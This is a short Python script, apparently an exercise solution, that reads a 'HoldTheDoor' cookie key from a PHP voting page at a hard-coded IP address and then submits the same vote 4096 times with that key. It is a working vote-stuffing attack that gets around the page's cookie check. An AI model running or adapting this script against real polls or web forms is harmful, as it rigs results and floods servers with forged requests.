#!/usr/bin/python3
""" THis  vote 4096 whit a cookie key"""
import requests

page = "http://158.69.76.135/level1.php"
res = requests.post(page)
key = res.cookies["HoldTheDoor"]
inyeccion = {"id": "930", "holdthedoor": "Submit", 'key': key}

for cont in range(0, 4096):
    requests.post(page, data=inyeccion, cookies={"HoldTheDoor": key})
print("hecho")
